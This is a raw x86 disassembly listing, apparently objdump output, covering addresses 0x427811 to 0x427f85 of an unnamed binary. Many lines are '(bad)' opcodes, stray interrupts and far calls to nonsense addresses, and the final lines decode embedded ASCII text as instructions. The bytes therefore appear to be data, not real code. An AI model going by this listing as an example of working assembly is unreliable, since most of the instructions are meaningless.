  427811:	int    0x8d
  427813:	mov    ch,cl
  427815:	xchg   esi,eax
  427816:	dec    esp
  427817:	add    dh,dl
  427819:	and    al,0x3b
  42781b:	jns    0x427858
  42781d:	ficom  DWORD PTR [ebx-0x2e]
  427820:	or     dh,BYTE PTR [esi-0x3]
  427823:	iret   
  427824:	jbe    0x427823
  427826:	jo     0x4277c2
  427828:	add    dh,dl
  42782a:	sbb    al,0xd3
  42782c:	repnz sub BYTE PTR [eax],al
  42782f:	(bad)  
  427830:	adc    al,0x0
  427832:	(bad)  
  427833:	xor    BYTE PTR [eax],al
  427835:	(bad)  
  427836:	dec    esp
  427837:	add    dh,dl
  427839:	mov    BYTE PTR [ebp+0xfe2b],bh
  42783f:	int    0x76
  427841:	mov    ch,cl
  427843:	lea    ecx,[edi+ebp*1+0x45]
  427847:	jge    0x4277db
  427849:	shr    ebx,cl
  42784b:	xchg   edx,eax
  42784c:	int    0x8d
  42784e:	mov    ch,cl
  427850:	xchg   esi,eax
  427851:	dec    esp
  427852:	cmp    edi,DWORD PTR [ecx+0x3b]
  427855:	fcmovbe st,st(3)
  427857:	repnz sub ch,cl
  42785a:	das    
  42785b:	push   ebx
  42785c:	rol    BYTE PTR [ebx+0x7d],cl
  42785f:	aam    0x36
  427861:	int    0x76
  427863:	xor    ch,cl
  427865:	lea    edx,[edi+ebp*1]
  427868:	inc    ebp
  427869:	jge    0x4277fd
  42786b:	shr    ebx,cl
  42786d:	xchg   edx,eax
  42786e:	int    0x8d
  427870:	xor    ch,cl
  427872:	xchg   esi,eax
  427873:	adc    al,0x3b
  427875:	jns    0x4278b2
  427877:	fcmovbe st,st(3)
  427879:	repnz sub ch,cl
  42787c:	lea    ebx,[ebx+edx*2]
  42787f:	shr    BYTE PTR [edi],cl
  427881:	shl    DWORD PTR [esi-0x3],1
  427884:	or     al,BYTE PTR [ecx+0x1cd2cba8]
  42788a:	adc    BYTE PTR [esi+0x5b71edcd],0x98
  427891:	call   0xcd3c:0xd6cd6d3b
  427898:	xchg   esi,eax
  427899:	inc    esp
  42789a:	int    0xe6
  42789c:	and    al,0x5d
  42789e:	mov    ebp,0x5f25230a
  4278a3:	jnp    0x4278dc
  4278a5:	ficom  WORD PTR [ebx]
  4278a7:	inc    ebx
  4278a8:	icebp  
  4278a9:	das    
  4278aa:	or     BYTE PTR [edi],al
  4278ac:	add    BYTE PTR [eax-0x4613080],0x82
  4278b3:	test   BYTE PTR [ebx-0xc],al
  4278b6:	jnp    0x42789e
  4278b8:	inc    ebx
  4278b9:	hlt    
  4278ba:	(bad)  
  4278bb:	mov    BYTE PTR [ebx-0xf],al
  4278be:	das    
  4278bf:	add    eax,0x80809216
  4278c4:	adc    bh,bh
  4278c6:	jno    0x4278ff
  4278c8:	ficom  WORD PTR [ebx]
  4278ca:	(bad)  
  4278cb:	mov    BYTE PTR [ebx-0xf],al
  4278ce:	das    
  4278cf:	add    eax,0x80809285
  4278d4:	adc    bh,bh
  4278d6:	xchg   esi,eax
  4278d7:	aaa    
  4278d8:	ficom  WORD PTR [ebx]
  4278da:	(bad)  
  4278db:	mov    BYTE PTR [ebx-0xf],al
  4278de:	das    
  4278df:	add    eax,0x808080f8
  4278e4:	adc    bh,bh
  4278e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4278e7:	aaa    
  4278e8:	ficom  WORD PTR [ebx]
  4278ea:	(bad)  
  4278eb:	test   BYTE PTR [ebx-0xf],al
  4278ee:	aam    0x3e
  4278f0:	adc    bh,bh
  4278f2:	scas   al,BYTE PTR es:[edi]
  4278f3:	aaa    
  4278f4:	ficom  WORD PTR [ebx]
  4278f6:	(bad)  
  4278f7:	mov    BYTE PTR [ebx-0xf],al
  4278fa:	das    
  4278fb:	add    eax,0x808081db
  427900:	adc    bh,bh
  427902:	mov    dh,0x37
  427904:	ficom  WORD PTR [ebx]
  427906:	das    
  427907:	push   es
  427908:	into   
  427909:	add    DWORD PTR [eax+0x2ff14380],0x80809f05
  427913:	sub    bl,0x12
  427916:	add    DWORD PTR [eax+0x1cd60080],0x2cd600
  427920:	(bad)  
  427921:	adc    al,0x0
  427923:	(bad)  
  427924:	xor    BYTE PTR [eax],al
  427926:	(bad)  
  427927:	dec    esp
  427928:	add    dh,dl
  42792a:	mov    BYTE PTR [ebp+0xff77],bh
  427930:	jmp    0x4278e8
  427932:	add    DWORD PTR [eax-0x3900ed80],0xd613de37
  42793c:	mov    BYTE PTR [ebx-0xf],al
  42793f:	das    
  427940:	add    eax,0x80808019
  427945:	adc    bh,bh
  427947:	xchg   ecx,eax
  427948:	aaa    
  427949:	ficom  WORD PTR [ebx]
  42794b:	(bad)  
  42794c:	mov    BYTE PTR [ebx-0xf],al
  42794f:	das    
  427950:	add    eax,0x8080818e
  427955:	adc    bh,bh
  427957:	(bad)  
  427958:	aaa    
  427959:	ficom  WORD PTR [ebx]
  42795b:	(bad)  
  42795c:	test   BYTE PTR [ebx-0xf],al
  42795f:	aam    0x1c
  427961:	adc    bh,bh
  427963:	fidiv  WORD PTR [edi]
  427965:	ficom  WORD PTR [ebx]
  427967:	(bad)  
  427968:	mov    BYTE PTR [ebx-0xf],al
  42796b:	das    
  42796c:	add    eax,0x80808142
  427971:	adc    bh,bh
  427973:	out    0x37,al
  427975:	ficom  WORD PTR [ebx]
  427977:	in     al,dx
  427978:	iret   
  427979:	int    0x96
  42797b:	mov    ch,cl
  42797d:	(bad)  
  42797e:	dec    esp
  42797f:	int    0xe6
  427981:	mov    ch,cl
  427983:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427984:	dec    esp
  427985:	cmp    edx,DWORD PTR [ecx]
  427987:	cmp    esp,ebx
  427989:	das    
  42798a:	inc    ebp
  42798b:	sti    
  42798c:	xchg   edx,eax
  42798d:	shr    ecx,cl
  42798f:	sub    BYTE PTR [edx],dl
  427991:	clc    
  427992:	add    BYTE PTR [eax-0x102c9380],0x92
  427999:	cmp    ebx,ebp
  42799b:	push   ebx
  42799c:	clc    
  42799d:	int    0xe6
  42799f:	mov    BYTE PTR [ebx-0x2b],dl
  4279a2:	int    0xa6
  4279a4:	dec    esp
  4279a5:	xchg   ecx,ebx
  4279a7:	sbb    esi,esp
  4279a9:	or     dl,BYTE PTR [esi+0x4cd60a88]
  4279af:	int    0x96
  4279b1:	mov    ch,cl
  4279b3:	(bad)  
  4279b4:	dec    esp
  4279b5:	int    0xe6
  4279b7:	mov    ch,cl
  4279b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4279ba:	dec    esp
  4279bb:	cmp    edx,DWORD PTR [ecx]
  4279bd:	cmp    esp,ebx
  4279bf:	das    
  4279c0:	inc    ebp
  4279c1:	sti    
  4279c2:	xchg   edx,eax
  4279c3:	shr    ecx,cl
  4279c5:	sub    BYTE PTR [ebx],bh
  4279c7:	fst    st(3)
  4279c9:	out    dx,eax
  4279ca:	xchg   edx,eax
  4279cb:	adc    bh,al
  4279cd:	add    BYTE PTR [eax-0x2aac9380],0x53
  4279d4:	clc    
  4279d5:	ds xchg esi,eax
  4279d7:	xor    BYTE PTR [esi],bl
  4279d9:	(bad)  
  4279da:	adc    al,0xcd
  4279dc:	xchg   esi,eax
  4279dd:	cmp    al,0xcd
  4279df:	(bad)  
  4279e0:	inc    esp
  4279e1:	int    0x96
  4279e3:	xor    ch,cl
  4279e5:	(bad)  
  4279e6:	adc    al,0xcd
  4279e8:	xchg   esi,eax
  4279e9:	xor    ch,cl
  4279eb:	(bad)  
  4279ec:	adc    al,0xcd
  4279ee:	out    0x30,al
  4279f0:	int    0xa6
  4279f2:	adc    al,0x3b
  4279f4:	adc    DWORD PTR [ebx],edi
  4279f6:	jecxz  0x427a27
  4279f8:	inc    ebp
  4279f9:	sti    
  4279fa:	xchg   edx,eax
  4279fb:	shr    ecx,cl
  4279fd:	sub    BYTE PTR [ebx],bh
  4279ff:	fst    QWORD PTR [edx]
  427a01:	clc    
  427a02:	add    BYTE PTR [eax-0x102c9380],0x92
  427a09:	push   ebx
  427a0a:	clc    
  427a0b:	int    0xe6
  427a0d:	cmp    al,0x53
  427a0f:	aad    0xcd
  427a11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427a12:	inc    esp
  427a13:	cmp    edi,edx
  427a15:	cmp    ebx,DWORD PTR [ebp-0x32c38933]
  427a1b:	lea    eax,[edi+ebp*1+0x45]
  427a1f:	loope  0x4279b3
  427a21:	cmp    ecx,ebx
  427a23:	shr    DWORD PTR [ebp-0x7f7fa9d8],cl
  427a29:	sub    BYTE PTR [ebx+edx*2-0x6],0xcd
  427a2e:	lea    esi,[eax]
  427a30:	shr    esp,cl
  427a32:	xchg   edx,eax
  427a33:	push   ebx
  427a34:	popf   
  427a35:	xchg   ecx,ebx
  427a37:	int    0x96
  427a39:	adc    al,0x1b
  427a3b:	hlt    
  427a3c:	add    al,0xf2
  427a3e:	std    
  427a3f:	shr    edi,cl
  427a41:	sub    BYTE PTR [ebx],bh
  427a43:	ins    DWORD PTR es:[edi],dx
  427a44:	adc    al,BYTE PTR [edx]
  427a46:	aam    0x37
  427a48:	ficom  WORD PTR [ebx]
  427a4a:	adc    bh,bl
  427a4c:	mov    ebp,0xcd25230a
  427a51:	out    0x3c,al
  427a53:	int    0xa6
  427a55:	inc    esp
  427a56:	add    al,0xe9
  427a58:	std    
  427a59:	adc    bh,al
  427a5b:	aam    0x37
  427a5d:	ficom  WORD PTR [ebx]
  427a5f:	adc    dh,ah
  427a61:	mov    ebp,0x8725230a
  427a66:	lock int 0xe6
  427a69:	and    al,0x1b
  427a6b:	aad    0x53
  427a6d:	rcl    BYTE PTR [esi-0x43],cl
  427a70:	or     ah,BYTE PTR [ebx]
  427a72:	and    eax,0x12025370
  427a77:	not    esi
  427a79:	aaa    
  427a7a:	ficom  WORD PTR [ebx]
  427a7c:	cwde   
  427a7d:	add    dh,dl
  427a7f:	xor    al,0x0
  427a81:	(bad)  
  427a82:	sub    al,0x9a
  427a84:	add    dh,dl
  427a86:	sbb    al,0x0
  427a88:	(bad)  
  427a89:	adc    al,0x0
  427a8b:	(bad)  
  427a8c:	xor    BYTE PTR [eax],al
  427a8e:	(bad)  
  427a8f:	dec    esp
  427a90:	add    dh,dl
  427a92:	mov    BYTE PTR [ebp+0xfef4],bh
  427a98:	or     cl,BYTE PTR [ebx-0x57557433]
  427a9e:	arpl   bx,cx
  427aa0:	sar    BYTE PTR [eax+eax*4],cl
  427aa3:	int    0x96
  427aa5:	mov    ch,cl
  427aa7:	(bad)  
  427aa8:	dec    esp
  427aa9:	int    0xe6
  427aab:	mov    ch,cl
  427aad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427aae:	dec    esp
  427aaf:	cmp    esp,ebx
  427ab1:	cmp    edx,DWORD PTR [ecx]
  427ab3:	das    
  427ab4:	inc    ebp
  427ab5:	sti    
  427ab6:	xchg   edx,eax
  427ab7:	shr    ecx,cl
  427ab9:	sub    BYTE PTR [edx],dl
  427abb:	clc    
  427abc:	add    BYTE PTR [eax-0x102c9380],0x92
  427ac3:	cmp    ebx,ebp
  427ac5:	push   ebx
  427ac6:	aad    0x53
  427ac8:	clc    
  427ac9:	int    0xe6
  427acb:	xor    ch,cl
  427acd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427ace:	adc    al,0x53
  427ad0:	fst    DWORD PTR [ebx-0xc]
  427ad3:	or     dl,BYTE PTR [esi+0x14d60a30]
  427ad9:	int    0x96
  427adb:	cmp    al,0xcd
  427add:	(bad)  
  427ade:	inc    esp
  427adf:	int    0x96
  427ae1:	xor    ch,cl
  427ae3:	(bad)  
  427ae4:	adc    al,0xcd
  427ae6:	xchg   esi,eax
  427ae7:	mov    ch,cl
  427ae9:	(bad)  
  427aea:	dec    esp
  427aeb:	int    0x96
  427aed:	mov    ch,cl
  427aef:	(bad)  
  427af0:	dec    esp
  427af1:	int    0xe6
  427af3:	mov    ch,cl
  427af5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427af6:	dec    esp
  427af7:	cmp    esp,ebx
  427af9:	cmp    edx,DWORD PTR [ecx]
  427afb:	das    
  427afc:	inc    ebp
  427afd:	sti    
  427afe:	xchg   edx,eax
  427aff:	shr    ecx,cl
  427b01:	sub    BYTE PTR [edx],dl
  427b03:	clc    
  427b04:	add    BYTE PTR [eax-0x22c49380],0x53
  427b0b:	aad    0xd3
  427b0d:	out    dx,eax
  427b0e:	xchg   edx,eax
  427b0f:	push   ebx
  427b10:	clc    
  427b11:	int    0xe6
  427b13:	xor    ch,cl
  427b15:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b16:	adc    al,0x3b
  427b18:	cli    
  427b19:	cmp    ebx,DWORD PTR [ebp-0x32cf8933]
  427b1f:	lea    edx,[edi+ebp*1]
  427b22:	inc    ebp
  427b23:	loope  0x427ab7
  427b25:	cmp    ecx,ebx
  427b27:	push   ebx
  427b28:	cli    
  427b29:	shr    DWORD PTR [ebp-0x7f7fa9d8],cl
  427b2f:	sub    BYTE PTR [ebx+edx*8-0x14],0x92
  427b34:	push   ebx
  427b35:	popf   
  427b36:	int    0x76
  427b38:	cmp    al,0xcd
  427b3a:	lea    eax,[edi+eax*4-0x27]
  427b3e:	int    0xe6
  427b40:	cmp    al,0x1b
  427b42:	hlt    
  427b43:	int    0xa6
  427b45:	inc    esp
  427b46:	adc    al,BYTE PTR [edx]
  427b48:	mov    ebp,0x5625230a
  427b4d:	jnp    0x427b86
  427b4f:	ficom  WORD PTR [ebx]
  427b51:	das    
  427b52:	inc    ebp
  427b53:	jge    0x427ae7
  427b55:	shr    ecx,cl
  427b57:	sub    bl,dl
  427b59:	jmp    0x427aed
  427b5b:	cmp    ebx,ebp
  427b5d:	adc    bh,al
  427b5f:	add    BYTE PTR [eax-0xfac9380],0x53
  427b66:	lds    eax,FWORD PTR [edi-0x32fde40f]
  427b6c:	lea    ecx,[eax-0x32b36933]
  427b72:	out    0x30,al
  427b74:	int    0xa6
  427b76:	adc    al,0x4
  427b78:	repnz std 
  427b7a:	add    al,0xe9
  427b7c:	std    
  427b7d:	adc    al,BYTE PTR [edx]
  427b7f:	aam    0x37
  427b81:	ficom  WORD PTR [ebx]
  427b83:	adc    bh,al
  427b85:	aam    0x37
  427b87:	ficom  WORD PTR [ebx]
  427b89:	shr    edi,cl
  427b8b:	sub    BYTE PTR [ebx],bh
  427b8d:	ins    DWORD PTR es:[edi],dx
  427b8e:	adc    bh,bl
  427b90:	mov    ebp,0x1225230a
  427b95:	hlt    
  427b96:	mov    ebp,0x8725230a
  427b9b:	lock sbb edx,ebp
  427b9e:	jmp    0x427be7
  427ba0:	inc    DWORD PTR [eax]
  427ba2:	add    BYTE PTR [esi-0x12fb1233],dl
  427ba8:	sbb    al,0x98
  427baa:	pop    edi
  427bab:	(bad)  
  427bac:	aaa    
  427bad:	ficom  WORD PTR [ebx]
  427baf:	or     cl,BYTE PTR [ebp+0xabd5d11]
  427bb5:	and    esp,DWORD PTR ds:0xc9f5760a
  427bbb:	jbe    0x427b7a
  427bbd:	xchg   ecx,eax
  427bbe:	aaa    
  427bbf:	ficom  WORD PTR [ebx]
  427bc1:	or     dh,BYTE PTR [esi-0x13]
  427bc4:	int    0x96
  427bc6:	adc    ebp,ecx
  427bc8:	(bad)  
  427bc9:	cmc    
  427bca:	call   0xefd3:0x92fb452f
  427bd1:	xchg   edx,eax
  427bd2:	int    0xd6
  427bd4:	adc    ebp,ecx
  427bd6:	out    0xf5,al
  427bd8:	jo     0x427bec
  427bda:	sti    
  427bdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427bdc:	mov    esi,0x3b4229
  427be1:	jno    0x427c36
  427be3:	(bad)  [edx]
  427be5:	xchg   esi,eax
  427be6:	std    
  427be7:	int    0x96
  427be9:	dec    esp
  427bea:	or     dl,BYTE PTR [esi+0x4cd6004c]
  427bf0:	iret   
  427bf1:	jbe    0x427bf0
  427bf3:	add    dh,dl
  427bf5:	mov    bl,dl
  427bf7:	mov    ecx,0xd6007028
  427bfc:	dec    esp
  427bfd:	add    dh,dl
  427bff:	in     eax,dx
  427c00:	add    dh,dl
  427c02:	mov    ebp,0xf5d600
  427c07:	(bad)  
  427c08:	adc    DWORD PTR [ebp+0xfde6],edi
  427c0e:	stos   BYTE PTR es:[edi],al
  427c0f:	or     dh,BYTE PTR [esi-0x3]
  427c12:	int    0x76
  427c14:	std    
  427c15:	test   al,0xcb
  427c17:	ror    BYTE PTR [eax-0x12326980],cl
  427c1d:	add    al,0xb5
  427c1f:	stc    
  427c20:	add    al,0xed
  427c22:	inc    esp
  427c23:	cwde   
  427c24:	leave  
  427c25:	je     0x427c5b
  427c27:	xor    al,0x80
  427c29:	add    BYTE PTR [eax+0x3474c980],0x44
  427c30:	add    BYTE PTR [eax+0x74cf8080],0x34
  427c37:	xor    BYTE PTR [eax+0x0],dh
  427c3a:	(bad)  
  427c3b:	xor    al,0x0
  427c3d:	(bad)  
  427c3e:	sub    al,0x0
  427c40:	(bad)  
  427c41:	and    al,0x0
  427c43:	(bad)  
  427c44:	sbb    al,0x0
  427c46:	(bad)  
  427c47:	adc    al,0x0
  427c49:	(bad)  
  427c4a:	xor    BYTE PTR [eax],al
  427c4c:	(bad)  
  427c4d:	dec    esp
  427c4e:	add    dh,dl
  427c50:	mov    BYTE PTR [ebp+0xe7e7],bh
  427c56:	int    0x76
  427c58:	mov    BYTE PTR [edx],cl
  427c5a:	je     0x427c90
  427c5c:	test   ch,cl
  427c5e:	je     0x427c94
  427c60:	xor    al,0x6
  427c62:	ins    DWORD PTR es:[edi],dx
  427c63:	das    
  427c64:	add    eax,0x80808017
  427c69:	int    0x74
  427c6b:	xor    al,0x44
  427c6d:	push   es
  427c6e:	ins    DWORD PTR es:[edi],dx
  427c6f:	das    
  427c70:	add    eax,0x8080800a
  427c75:	add    ah,dl
  427c77:	xor    al,0x24
  427c79:	add    ah,dl
  427c7b:	xor    al,0x24
  427c7d:	add    ah,dl
  427c7f:	xor    al,0x24
  427c81:	int    0x74
  427c83:	xor    al,0x50
  427c85:	add    cl,dh
  427c87:	int    0x74
  427c89:	xor    al,0x84
  427c8b:	int    0x74
  427c8d:	xor    al,0x84
  427c8f:	int    0x74
  427c91:	xor    al,0x84
  427c93:	iret   
  427c94:	jbe    0x427c1a
  427c96:	or     dh,BYTE PTR [esp+esi*1-0x78]
  427c9a:	int    0x74
  427c9c:	xor    al,0x3c
  427c9e:	xchg   DWORD PTR [esp+esi*1-0x7c],esi
  427ca2:	or     dh,BYTE PTR [esp+esi*1-0x7c]
  427ca6:	int    0x74
  427ca8:	xor    al,0x84
  427caa:	int    0x74
  427cac:	xor    al,0x84
  427cae:	int    0x8c
  427cb0:	xor    al,0x84
  427cb2:	int    0xa
  427cb4:	and    eax,0xcd808081
  427cb9:	xor    ebp,ecx
  427cbb:	aam    0x34
  427cbd:	mov    ch,cl
  427cbf:	add    DWORD PTR ds:0x5e808081,ebp
  427cc5:	sbb    BYTE PTR [edi],ch
  427cc7:	or     edx,DWORD PTR ds:0xcd808081
  427ccd:	xor    ch,cl
  427ccf:	push   eax
  427cd0:	int    0x62
  427cd2:	fs iret 
  427cd4:	xchg   esp,eax
  427cd5:	sbb    BYTE PTR [eax-0x33],dh
  427cd8:	push   ecx
  427cd9:	int    0x22
  427cdb:	xchg   DWORD PTR [ecx-0x77cb2b33],ebx
  427ce1:	pop    esi
  427ce2:	sbb    BYTE PTR [edi],ch
  427ce4:	add    al,0x7b
  427ce6:	add    DWORD PTR [eax+0x3494cd80],0xcd51cd88
  427cf0:	dec    edx
  427cf1:	int    0x80
  427cf3:	xor    ecx,DWORD PTR [edi]
  427cf5:	xchg   ebx,edx
  427cf7:	or     dl,BYTE PTR [edx-0x7f7e8d15]
  427cfd:	or     ch,0x74
  427d00:	xor    al,0x44
  427d02:	push   es
  427d03:	ins    DWORD PTR es:[edi],dx
  427d04:	das    
  427d05:	push   es
  427d06:	cwde   
  427d07:	add    DWORD PTR [eax+0x3474cd80],0x2d01cd84
  427d11:	add    DWORD PTR [eax+0xa80cd80],0xcd4c3474
  427d1b:	je     0x427d51
  427d1d:	test   ch,cl
  427d1f:	add    DWORD PTR ds:0xcd808081,esp
  427d25:	or     BYTE PTR [edx],0x74
  427d28:	xor    al,0x4c
  427d2a:	int    0x74
  427d2c:	xor    al,0x84
  427d2e:	int    0x1
  427d30:	or     DWORD PTR [ecx-0x7f327f80],eax
  427d36:	int    0x80
  427d38:	or     dh,BYTE PTR [esp+esi*1+0x4c]
  427d3c:	int    0x74
  427d3e:	xor    al,0x84
  427d40:	int    0x1
  427d42:	int3   
  427d43:	add    DWORD PTR [eax-0x327f3280],0x34740a80
  427d4d:	dec    esp
  427d4e:	int    0x74
  427d50:	xor    al,0x84
  427d52:	int    0x8c
  427d54:	xor    al,0x84
  427d56:	int    0x1
  427d58:	popf   
  427d59:	add    DWORD PTR [eax-0x62f53280],0xcd808081
  427d63:	or     ch,0x89
  427d66:	imul   edx,ecx,0x3b358621
  427d6c:	jns    0x427d72
  427d6e:	add    bh,bh
  427d70:	sar    DWORD PTR [ebp+0x28f2d392],cl
  427d76:	push   ebx
  427d77:	jge    0x427d83
  427d79:	mov    WORD PTR [esp+ecx*2],?
  427d7c:	leave  
  427d7d:	je     0x427db3
  427d7f:	mov    BYTE PTR [eax-0x327f7f80],al
  427d85:	je     0x427dbb
  427d87:	xor    al,0x6
  427d89:	ins    DWORD PTR es:[edi],dx
  427d8a:	aam    0x73
  427d8c:	int    0x74
  427d8e:	xor    al,0x30
  427d90:	add    al,0xbd
  427d92:	adc    ah,0x52
  427d95:	jl     0x427d6b
  427d97:	cmp    edi,DWORD PTR [esp+edi*2-0x2c]
  427d9b:	and    edi,DWORD PTR [esi+edx*8+0x52]
  427d9f:	add    ah,dl
  427da1:	xor    al,0x2c
  427da3:	add    ah,dl
  427da5:	xor    al,0x2c
  427da7:	add    ah,dl
  427da9:	xor    al,0x2c
  427dab:	add    ah,dl
  427dad:	xor    al,0x2c
  427daf:	int    0x74
  427db1:	xor    al,0x54
  427db3:	add    cl,dh
  427db5:	in     al,dx
  427db6:	cmp    BYTE PTR [eax],al
  427db8:	aam    0x34
  427dba:	and    al,0x0
  427dbc:	aam    0x34
  427dbe:	and    al,0x0
  427dc0:	aam    0x34
  427dc2:	and    al,0xcd
  427dc4:	je     0x427dfa
  427dc6:	push   eax
  427dc7:	add    cl,dh
  427dc9:	in     al,dx
  427dca:	and    al,BYTE PTR [eax]
  427dcc:	aam    0x34
  427dce:	adc    al,0xcd
  427dd0:	je     0x427e06
  427dd2:	cmp    al,0x0
  427dd4:	icebp  
  427dd5:	in     al,dx
  427dd6:	xchg   ch,cl
  427dd8:	je     0x427e0e
  427dda:	xor    al,0x0
  427ddc:	icebp  
  427ddd:	or     dh,BYTE PTR [esp+esi*1-0x78]
  427de1:	int    0x74
  427de3:	xor    al,0x4c
  427de5:	push   es
  427de6:	ins    DWORD PTR es:[edi],dx
  427de7:	aam    0x4e
  427de9:	int    0x74
  427deb:	xor    al,0x84
  427ded:	leave  
  427dee:	add    DWORD PTR [ebp+0x41808081],ebp
  427df4:	and    DWORD PTR [esi+0x3474cd35],eax
  427dfa:	mov    ch,cl
  427dfc:	mov    WORD PTR [esp+eax*4],?
  427dff:	int    0xa
  427e01:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e02:	add    DWORD PTR [eax-0x367ef580],0x49883474
  427e0c:	and    DWORD PTR [esi+0x3474cd35],eax
  427e12:	mov    ch,cl
  427e14:	mov    WORD PTR [eax+ecx*4],?
  427e17:	cmp    edi,DWORD PTR [ecx+0x4]
  427e1a:	add    bh,bh
  427e1c:	shl    edx,cl
  427e1e:	sub    bl,dl
  427e20:	mov    ebp,0xcdd35392
  427e25:	mov    WORD PTR [esp+ecx*2],?
  427e28:	inc    ebx
  427e29:	rcl    esi,cl
  427e2b:	and    ecx,ebp
  427e2d:	je     0x427e63
  427e2f:	test   ch,cl
  427e31:	mov    WORD PTR [esp+eax*4],?
  427e34:	int    0xa
  427e36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427e37:	add    DWORD PTR [eax-0x32aeff80],0x80811101
  427e41:	add    BYTE PTR [eax],0x70
  427e44:	cmp    al,0xec
  427e46:	push   ds
  427e47:	iret   
  427e48:	jbe    0x427dce
  427e4a:	or     dh,BYTE PTR [esp+esi*1+0x4c]
  427e4e:	int    0x74
  427e50:	xor    al,0x4c
  427e52:	int    0x8c
  427e54:	xor    al,0x84
  427e56:	int    0xa
  427e58:	in     al,0x81
  427e5a:	add    BYTE PTR [eax-0x777e7633],0xcd
  427e61:	je     0x427e97
  427e63:	test   ch,cl
  427e65:	add    ebp,ebp
  427e67:	add    DWORD PTR [eax-0x3277ff80],0xcd84348c
  427e71:	or     bh,BYTE PTR [ebp-0x327f7f7f]
  427e77:	or     bh,0x84
  427e7a:	adc    cl,ch
  427e7c:	mov    WORD PTR [esp+eax*4],?
  427e7f:	int    0xa
  427e81:	in     al,0x81
  427e83:	add    BYTE PTR [eax-0x76327f33],0x81
  427e8a:	mov    BYTE PTR [eax-0x2d591833],ch
  427e90:	sub    al,0x80
  427e92:	lds    edx,FWORD PTR [eax+0x75]
  427e95:	ins    BYTE PTR es:[edi],dx
  427e96:	jae    0x427f0f
  427e98:	bound  ebp,QWORD PTR gs:[edi+0x6c]
  427e9c:	bound  esp,QWORD PTR fs:[ebp+0x64]
  427ea0:	add    BYTE PTR [ecx+0x74],ah
  427ea3:	ins    BYTE PTR es:[edi],dx
  427ea4:	popa   
  427ea5:	inc    esp
  427ea6:	gs popa 
  427ea8:	fs push 0x6561686d
  427eae:	add    BYTE PTR fs:[ebp+0x74],ah
  427eb2:	push   0x65726143
  427eb7:	outs   dx,DWORD PTR ds:[esi]
  427eb8:	jns    0x427f20
  427eba:	add    BYTE PTR gs:[edi+0x72],dh
  427ebe:	jns    0x427f2d
  427ec0:	popa   
  427ec1:	outs   dx,DWORD PTR ds:[esi]
  427ec2:	bound  ebp,QWORD PTR gs:[ecx+0x74]
  427ec6:	add    BYTE PTR [edi+ebp*2+0x73],dh
  427eca:	push   0x6f6d6568
  427ecf:	add    BYTE PTR fs:[edx+0x65],dl
  427ed3:	arpl   WORD PTR [ebx+0x62],si
  427ed6:	popa   
  427ed7:	ins    BYTE PTR es:[edi],dx
  427ed8:	jne    0x427f52
  427eda:	gs jae 0x427edd
  427edd:	ins    DWORD PTR es:[edi],dx
  427ede:	imul   edi,DWORD PTR [eax+0x50],0x64726569
  427ee5:	outs   dx,DWORD PTR ds:[esi]
  427ee6:	jb     0x427f57
  427ee8:	jo     0x427eea
  427eea:	ja     0x427f4d
  427eec:	gs je  0x427f5e
  427eef:	jb     0x427f60
  427ef1:	bound  esp,QWORD PTR [ecx+0x70]
  427ef4:	add    BYTE PTR [ebx+0x69],cl
  427ef7:	outs   dx,BYTE PTR ds:[esi]
  427ef8:	addr16 addr16 popa 
  427efb:	outs   dx,BYTE PTR ds:[esi]
  427efc:	arpl   WORD PTR [ecx+0x70],sp
  427eff:	add    BYTE PTR [edi+0x6e],al
  427f02:	jne    0x427f77
  427f04:	je     0x427f6b
  427f06:	outs   dx,BYTE PTR ds:[esi]
  427f07:	push   esi
  427f08:	popa   
  427f09:	jb     0x427f84
  427f0b:	add    BYTE PTR [ebx+esi*2+0x61],dl
  427f0f:	jb     0x427f61
  427f11:	popa   
  427f12:	ins    BYTE PTR es:[edi],dx
  427f13:	ins    DWORD PTR es:[edi],dx
  427f14:	je     0x427f7f
  427f16:	outs   dx,DWORD PTR ds:[esi]
  427f17:	ja     0x427f7e
  427f19:	jb     0x427f1b
  427f1b:	jo     0x427f82
  427f1d:	ins    DWORD PTR es:[edi],dx
  427f1e:	jns    0x427f94
  427f20:	push   0x6f656562
  427f25:	outs   dx,BYTE PTR ds:[esi]
  427f26:	push   eax
  427f27:	imul   esi,DWORD PTR [eax+0x79],0x786f6200
  427f2e:	inc    ebx
  427f2f:	outs   dx,DWORD PTR ds:[esi]
  427f30:	popa   
  427f31:	ins    BYTE PTR es:[edi],dx
  427f32:	popa   
  427f33:	imul   ebp,DWORD PTR [eax+0x65],0x656573
  427f3a:	je     0x427fb5
  427f3c:	outs   dx,DWORD PTR gs:[esi]
  427f3e:	outs   dx,BYTE PTR ds:[esi]
  427f3f:	gs ins BYTE PTR es:[edi],dx
  427f41:	inc    ebx
  427f42:	push   0x54007261
  427f47:	jns    0x427fb9
  427f49:	jns    0x427fb8
  427f4b:	jne    0x427fb2
  427f4d:	imul   eax,DWORD PTR gs:[eax],0x70
  427f51:	outs   dx,DWORD PTR ds:[esi]
  427f52:	je     0x427f96
  427f54:	gs gs jb 0x427fc8
  427f58:	outs   dx,DWORD PTR ds:[esi]
  427f59:	je     0x427fc6
  427f5b:	imul   eax,DWORD PTR [eax],0x616c7548
  427f61:	jo     0x427fcc
  427f63:	popa   
  427f64:	ins    BYTE PTR es:[edi],dx
  427f65:	dec    ebx
  427f66:	outs   dx,BYTE PTR ds:[esi]
  427f67:	popa   
  427f68:	jo     0x427fe3
  427f6a:	add    BYTE PTR gs:[eax+0x6f],dh
  427f6e:	je     0x427fb2
  427f70:	gs ins BYTE PTR es:[edi],dx
  427f72:	jae    0x427fe3
  427f74:	js     0x427f76
  427f76:	popa   
  427f77:	data16 je 0x427fc0
  427f7a:	ins    BYTE PTR es:[edi],dx
  427f7b:	popa   
  427f7c:	imul   esp,DWORD PTR [ebp+0x78],0x70
  427f80:	gs jae 0x427fe4
  427f83:	jb     0x427f85
  427f85:	inc    edx
